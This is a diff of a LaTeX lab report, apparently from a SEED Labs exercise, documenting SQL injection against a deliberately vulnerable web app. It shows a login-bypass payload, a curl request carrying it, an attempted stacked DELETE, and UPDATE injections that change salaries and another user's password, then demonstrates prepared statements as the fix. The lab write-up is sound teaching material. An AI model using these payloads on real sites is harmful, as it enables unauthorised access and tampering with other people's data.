@@ -600,7 +600,7 @@ With both the HTMLawed plugin and the htmlspecialchars PHP function enabled, the
 \subsection{Get Familiar with SQL Statements}
 We can use the following SQL statement lstlisting \ref{lst:task13} to get the information of the table, as shown in Figure \ref{fig:task13}.
 
-\begin{lstlisting}[caption={select Alice's information},label={lst:task13},language=SQL,breaklines=true]
+\begin{lstlisting}[caption={SQL Statements},label={lst:task13},language=SQL,breaklines=true]
 select * from credential where name='Alice';
 \end{lstlisting}
 \begin{figure}[h]
@@ -618,7 +618,7 @@ First, we use the following SQL statement lstlisting \ref{lst:task14.1} to get t
     \caption{SQL Injection Attack from webpage}\label{fig:task14.1}
 \end{figure}
 
-\begin{lstlisting}[caption={select Alice's information},label={lst:task14.1},language=SQL,breaklines=true]
+\begin{lstlisting}[caption={SQL Injection},label={lst:task14.1},language=SQL,breaklines=true]
 SELECT id, name, eid, salary, birth, ssn, address, email,
 nickname, Password 
 FROM credential
@@ -632,7 +632,136 @@ WHERE name='admin' #'and Password='123'
 \end{figure}
 
 \subsubsection{Sub-task 2: SQL Injection Attack from command line}
+We can use the following command \ref{lst:task14.2} to get the information, as shown in Figure \ref{fig:task14.3}.
+\begin{lstlisting}[caption={SQL Injection Command},label={lst:task14.2},language=BASH,breaklines=true]
+curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27+%23&Password=123'
+\end{lstlisting}
+\begin{figure}[h]
+    \centering
+       \includegraphics[width=0.82\textwidth]{figures/task14/task14.3.png}
+    \caption{SQL Injection Attack from command line Result}\label{fig:task14.3}
+\end{figure}
 
+\subsubsection{Sub-task 3: Append a new SQL statement}
+
+I try to use this statement as username \verb|admin';delete from credential WHERE name='Ted' #|, because it will conduct to a SQL query as shown in Listing \ref{lst:task14.3}, the result is shown in Figure \ref{fig:task14.4}, which indicates that the script cannot delete the record, because the php code \verb|$result = $conn -> query($sql);| will only execute the first \verb|SELECT| SQL query.
+
+\begin{lstlisting}[caption={SQL Injection for delete Record},label={lst:task14.3},language=SQL,breaklines=true]
+SELECT id, name, eid, salary, birth, ssn, address, email,
+nickname, Password 
+FROM credential
+WHERE name='admin';delete from credential WHERE name='Ted' #'and Password='123'
+\end{lstlisting}
+\begin{figure}[h]
+    \centering
+       \includegraphics[width=0.82\textwidth]{figures/task14/task14.4.png}
+    \caption{SQL Append Attack Result}\label{fig:task14.4}
+\end{figure}
+
+\subsection{SQL Injection Attack on UPDATE Statement}
+\subsubsection{Sub-task 1: Modify your own salary}
+As shown in Figure \ref{fig:task15.1}, we can use the following SQL Injection \verb|A', Salary='33333| shown in \ref{fig:task15.2} to modify the salary of the user, beacuse the UPDATE SQL Query will become 
+
+\verb|UPDATE credential SET nickname='A', Salary='33333',...|, 
+
+the result is shown in Figure \ref{fig:task15.3}, which indicates that the script successfully executed the SQL injection attack, modifying the salary of the user to the specified value.
+\begin{figure}[h]
+    \centering
+  \subfloat[Original Profile\label{fig:task15.1}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.1.png}
+    }
+    \hfill
+  \subfloat[SQL Injection\label{fig:task15.2}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.2.png}
+    }
+    \hfill
+    \subfloat[Result\label{fig:task15.3}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.3.png}
+    }
+    \hfill
+    \caption{SQL Injection Attack on UPDATE 1}\label{fig:task15-1}
+\end{figure}
+
+\subsubsection{Sub-task 2: Modify other people’ salary}
+
+As shown in Figure \ref{fig:task15.4}, we can use the following SQL Injection \verb|A', Salary=1 where name='Boby' #| shown in \ref{fig:task15.5} to modify the salary of the user, beacuse the UPDATE SQL Query will become 
+
+\verb|UPDATE credential SET nickname='A', Salary=1 where name='Boby' #|, 
+
+the result is shown in Figure \ref{fig:task15.6}, which indicates that the script successfully executed the SQL injection attack, modifying the salary of the user to the specified value.
+
+
+\begin{figure}[h]
+    \centering
+  \subfloat[Original Profile\label{fig:task15.4}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.4.png}
+    }
+    \hfill
+  \subfloat[SQL Injection\label{fig:task15.5}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.5.png}
+    }
+    \hfill
+    \subfloat[Result\label{fig:task15.6}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.6.png}
+    }
+    \hfill
+    \caption{SQL Injection Attack on UPDATE 2}\label{fig:task15-2}
+\end{figure}
+
+\subsubsection{Modify other people’ password}
+As shown in Figure \ref{fig:task15.7}, we can use the following SQL Injection 
+
+\verb|B', Password=SHA1('huangkl') where name='Boby' #| 
+
+shown in \ref{fig:task15.8} to modify the salary of the user, beacuse the UPDATE SQL Query will become 
+
+\verb|UPDATE credential SET nickname='B', Password=SHA1('huangkl') where name='Boby' #|, 
+
+the result is shown in Figure \ref{fig:task15.9}, which indicates that the script successfully executed the SQL injection attack, modifying the salary of the user to the specified value.
+
+
+\begin{figure}[h]
+    \centering
+  \subfloat[SQL Injection\label{fig:task15.7}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.7.png}
+    }
+    \hfill
+  \subfloat[Boby Login with Set Password\label{fig:task15.8}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.8.png}
+    }
+    \hfill
+    \subfloat[Result\label{fig:task15.9}]{
+    \includegraphics[width=0.3\textwidth]{figures/task15/task15.9.png}
+    }
+    \hfill
+    \caption{SQL Injection Attack on UPDATE 3}\label{fig:task15-3}
+\end{figure}
+
+\subsection{SQL Countermeasure — Prepared Statement}
+We introduce the safe method to prevent the SQL Injection, as shown in Figure \ref{fig:task16.1}, the result is shown in Figure \ref{fig:task16.2}, which indicates that the script cannot execute the SQL Injection attack, because the server will verify the input and prevent the SQL Injection attack.
+\begin{figure}[h]
+    \centering
+       \includegraphics[width=0.9\textwidth]{figures/task16/task16.1.png}
+    \caption{Safe SQL SELECT Query}\label{fig:task16.1}
+\end{figure}
+
+\begin{figure}[h]
+    \centering
+       \includegraphics[width=0.6\textwidth]{figures/task16/task16.2.png}
+    \caption{SQL Injection Not Work}\label{fig:task16.2}
+\end{figure}
+
+Also that the safe method can be used in the UPDATE SQL Query, as shown in Figure \ref{fig:task16.4}, the result is shown in Figure \ref{fig:task16.3}, which indicates that the script cannot execute the SQL Injection attack, because the server will verify the input and prevent the SQL Injection attack.
+\begin{figure}[h]
+    \centering
+       \includegraphics[width=0.5\textwidth]{figures/task16/task16.3.png}
+    \caption{SQL Injection Not Work}\label{fig:task16.3}
+\end{figure}
+\begin{figure}[h!]
+    \centering
+       \includegraphics[width=0.95\textwidth]{figures/task16/task16.4.png}
+    \caption{Safe SQL UPDATE Query}\label{fig:task16.4}
+\end{figure}
 %------------------------------------------------
 
 %\bibliographystyle{ieeetr}
